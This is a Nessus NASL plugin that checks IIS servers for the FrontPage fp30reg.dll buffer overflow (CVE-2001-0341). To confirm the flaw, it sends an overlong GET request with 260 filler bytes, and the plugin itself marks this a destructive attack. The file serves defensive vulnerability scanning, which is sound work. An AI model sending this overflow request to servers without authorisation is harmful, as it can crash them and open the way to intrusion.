#
# This script was written by John Lampe <j_lampe@bellsouth.net>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10699);
 script_bugtraq_id(2906);
 script_cve_id("CVE-2001-0341");
 script_version ("$Revision: 1.29 $");

 name["english"] = "IIS FrontPage DoS II";
 script_name(english:name["english"]);

 desc["english"] = "
Microsoft IIS, running Frontpage extensions, is vulnerable to a remote 
buffer overflow attack. An attacker, exploiting this bug, may gain 
access to confidential data, critical business processes, and
elevated privileges on the attached network.  

Solution : Install either SP4 for Windows 2000 or apply the fix described
in Microsoft Bulletin MS03-051

See also : http://www.microsoft.com/technet/security/bulletin/MS03-051.mspx

Risk factor : High";

 script_description(english:desc["english"]);

 summary["english"] = "Attempts to overflow the fp30reg.dll dll";
 script_summary(english:summary["english"]);
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2001 John Lampe");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"],
               francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "IIS" >!< sig ) 
	exit(0);



#Make sure app is alive...
mystring = string("HEAD / HTTP/1.0\r\n\r\n");
if(get_port_state(port)) 
{
    mysoc = open_sock_tcp(port);
    if (! mysoc)
	exit(0);
    send(socket:mysoc, data:mystring);
    incoming = http_recv(socket:mysoc);
    if(!incoming) 
	exit(0);
    close(mysoc);
}


mystring= string ("GET /_vti_bin/_vti_aut/fp30reg.dll?" , crap(260), " HTTP/1.0\r\n\r\n");
if(get_port_state(port)) 
{
        mysoc = open_sock_tcp(port);
	if (! mysoc)
		exit(0);
        send(socket:mysoc, data:mystring);
        incoming=http_recv(socket:mysoc);
        match = egrep(pattern:".*The remote procedure call failed*" , string:incoming);
        if(match) 
		security_hole(port);
        close (mysoc);
}

